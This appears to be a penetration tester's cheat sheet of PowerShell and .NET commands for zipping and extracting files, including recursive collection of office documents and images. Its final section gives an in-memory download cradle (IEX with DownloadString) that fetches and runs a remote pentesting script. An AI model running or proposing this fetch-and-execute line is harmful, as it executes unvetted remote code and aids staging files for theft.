# Zip

## 01 - PowerShell

### 1.1 - Archive

```
PS C:\> Compress-Archive -Path C:\path\to\file.txt -DestinationPath file.zip -CompressionLevel Fastest
```

Update with new files.

```
PS C:\> Compress-Archive -Path C:\path\to\file.txt -Update -DestinationPath file.zip -CompressionLevel Fastest
```

Archive multiple files.

```
PS C:\> Get-ChildItem file_1.txt,file_2.txt | Compress-Archive -DestinationPath file.zip -CompressionLevel Fastest

PS C:\> Get-ChildItem -Path file_1.txt,file_2.txt | Compress-Archive -DestinationPath file.zip -CompressionLevel Fastest

PS C:\> Get-ChildItem -Path file_1.txt,file_2.txt | Compress-Archive -Update -DestinationPath file.zip -CompressionLevel Fastest
```

Recursively archive files with specific file extensions

```
PS C:\> Get-ChildItem -Recurse -Path C:\path\to\directory\ -Include *.txt,*.pdf,*.doc,*.docx,*.jpg,*.jpeg,*.png,*.ppt,*.pptx,*.xls,*.xlsx -ErrorAction SilentlyContinue | Compress-Archive -Update -DestinationPath file.zip -CompressionLevel Optimal -Confirm

PS C:\> Get-ChildItem -Recurse -Path C:\path\to\directory\ -Include *.txt,*.pdf,*.doc,*.docx,*.jpg,*.jpeg,*.png,*.ppt,*.pptx,*.xls,*.xlsx -ErrorAction SilentlyContinue | Compress-Archive -Update -DestinationPath file.zip -CompressionLevel Optimal -Force
```

Recursively archive files with specific file extensions. Ensure the filenames are unique to avoid duplicates.

```
PS C:\> Get-ChildItem -Recurse -Path C:\path\to\directory\ -Include *.txt,*.pdf,*.doc,*.docx,*.jpg,*.jpeg,*.png,*.ppt,*.pptx,*.xls,*.xlsx -ErrorAction SilentlyContinue | Sort-Object | Get-Unique | Compress-Archive -DestinationPath unique-backup.zip -CompressionLevel Optimal -Force
```

TODO: Use a checksum hash to uniquely identity to archive the files to avoid exact duplicates with the names nor `Sort-Object` and `Get-Unique`.

### 1.2 - Extract

```
PS C:\> Expand-Archive -Path .\file.zip -DestinationPath C:\path\to\directory
```

## 02 - DotNET

### 2.1 - Archive

```powershell
PS C:\> Add-Type -Assembly 'System.IO.Compression.Filesystem'
$directory = "C:\path\to\directory\"
[System.IO.Compression.ZipFile]::CreateFromDirectory(($directory), "C:\path\to\archive.zip", "Optimal", $true)
```

### 2.2 - Extract

```powershell
PS C:\> Add-Type -Assembly 'System.IO.Compression.Filesystem'
[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\path\to\file.zip', 'C:\Temp\')
```

## 03 - PowerShell Script

Download cradle through memory.

```
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/killswitch-GUI/PenTesting-Scripts/master/Invoke-EncryptedZip.ps1')
```

---
## References

- [killswitch-GUI: PenTesting-Scripts](https://github.com/killswitch-GUI/PenTesting-Scripts/blob/master/Invoke-EncryptedZip.ps1)